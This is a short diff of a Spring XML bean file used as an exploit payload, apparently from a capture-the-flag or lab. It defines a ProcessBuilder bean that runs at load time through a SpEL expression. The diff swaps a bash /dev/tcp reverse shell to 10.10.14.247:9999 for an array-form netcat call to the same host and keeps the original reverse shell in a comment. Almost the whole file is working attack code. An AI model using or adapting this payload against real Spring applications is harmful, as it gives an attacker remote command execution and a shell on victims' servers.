@@ -5,7 +5,14 @@
      http://www.springframework.org/schema/beans/spring-beans.xsd
 ">
   <bean id="pb" class="java.lang.ProcessBuilder">
-     <constructor-arg value="/bin/bash -i >& /dev/tcp/10.10.14.247/9999 0>&1" />
+     <constructor-arg>
+           <array>
+               <value>/bin/bash</value>
+               <value>-c</value>
+               <value>nc 10.10.14.247 9999</value>
+           </array>
+        </constructor-arg>
+    <!-- <constructor-arg value="/bin/bash -i >& /dev/tcp/10.10.14.247/9999 0>&1" /> -->
      <property name="beanpwnr" value="#{ pb.start() }"/>
   </bean>
 </beans>
